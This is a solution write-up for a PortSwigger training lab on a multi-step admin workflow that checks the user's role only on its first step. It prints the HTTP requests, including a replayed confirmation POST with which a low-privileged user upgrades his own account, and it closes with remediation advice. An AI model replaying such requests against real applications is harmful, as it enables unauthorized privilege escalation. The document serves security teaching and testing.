# Lab 12: Multi-Step Process with No Access Control on One Step

**Category:** Access Control Vulnerabilities
**Difficulty:** Practitioner
**Lab link:** [Multi-step process with no access control on one step](https://portswigger.net/web-security/access-control/lab-multi-step-process-with-no-access-control-on-one-step)

## Overview

The admin role-upgrade workflow has two steps. Access control (role check) is enforced on step 1 — the initial POST — but not on step 2 — the confirmation POST. A low-privileged user can skip step 1 entirely and POST directly to the confirmation endpoint to upgrade their own account.

## Key Concepts

- **Multi-step workflow access control gap:** developers sometimes assume that only an authorised user could reach step 2 (via step 1), so they don't add a redundant check on the later step. An attacker skips step 1 and hits step 2 directly.
- **Principle of complete mediation:** every request to a privileged action must independently verify authorization — not just the first request in the chain.

## Solution

### Step 1 — Map the admin workflow

Log in as `administrator` / `admin`. Upgrade a user via the admin panel. Capture both requests in Burp:

**Step 1 (checked):**
```
POST /admin-roles HTTP/1.1
Cookie: session=<admin-session>

username=carlos&action=upgrade
```

**Step 2 (unchecked):**
```
POST /admin-roles HTTP/1.1
Cookie: session=<admin-session>

username=carlos&action=upgrade&confirmed=true
```

### Step 2 — Log in as wiener

Log out. Log in as `wiener` / `peter`.

### Step 3 — Send step 2 directly

Replay the step 2 request with wiener's session and `username=wiener`:
```
POST /admin-roles HTTP/1.1
Cookie: session=<wiener-session>

username=wiener&action=upgrade&confirmed=true
```

The back-end processes the confirmation without checking wiener's role. Lab solved.

## Remediation

- Apply access control checks on **every step** of a multi-step process independently.
- Never assume a user reached step N legitimately because they claim to have done step N-1.
- Use a server-side state machine that tracks which steps were completed and by whom — don't rely on client-submitted flags like `confirmed=true`.

## Python Script

[solve.py on GitHub](https://github.com/codingvedant/burpsuite-academy-labs/blob/main/access-control/lab-12-multi-step-no-access-control/solve.py)

Logs in as wiener and sends the step-2 confirmation POST directly with `confirmed=true` to bypass the step-1 role check.

## Key Takeaways

- Multi-step workflows often have uneven access control — the last step is frequently the unprotected one.
- Skipping steps in a workflow is always worth testing; `confirmed=true` flags are a red flag.
- Authorization must be re-checked at every state transition, not just at the entry point.
